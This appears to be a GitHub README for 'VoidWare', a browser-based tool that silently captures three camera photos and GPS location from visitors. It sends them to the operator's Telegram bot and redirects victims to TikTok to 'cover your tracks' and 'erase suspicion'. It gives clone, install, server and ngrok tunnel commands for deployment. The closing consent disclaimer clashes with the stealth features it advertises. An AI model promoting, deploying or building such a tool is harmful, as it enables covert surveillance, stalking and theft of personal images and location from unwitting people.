# VoidWare

## ⚡ What is this?

VoidWare is a lightweight, stealthy client-server setup that captures 3 quick snapshots and location from a consenting user, shoots the data to your Telegram bot, then ghost redirects them to TikTok to cover your tracks.

Perfect for legit pentesting or controlled demos where you want clean, fast data grabs without raising alarms.

---
## 🔥 Features

- Slick, minimal spinner UI to keep users chill
- Snaps 3 silent photos lightning fast from the camera
- Sends images plus GPS coords straight to Telegram Bot API
- Works slick on both mobile and desktop browsers
- Zero dependencies on frontend, pure client side magic
- Python backend handles uploads and bot forwarding
- Redirects users to TikTok to erase suspicion

---

## 🛠 Setup & Run This Beast

```bash
git clone https://github.com/AbyssBite/VoidWare.git
cd VoidWare

# Build your Python virtual cage
python -m venv venv 

# Activate the virtual environment
# Linux/MacOS:
source venv/bin/activate
# Windows:
venv\Scripts\activate

# Install dependencies
pip install -r requirements.txt

# Setup your environment: bot token, chat ID, TikTok URL
python init_env.py

# Launch your backend server to catch data
python -m app.server

```

> **Note:** The app **requires HTTPS** to request camera and location permissions.  
> For testing, use [ngrok](https://ngrok.com/) to expose your local server securely.

Keep your Python backend running, then open a **new terminal window** and run

```bash
ngrok http 3000
```

## ⚠️ Disclaimer
This service strictly requires explicit user consent and is intended solely for educational and ethical testing purposes.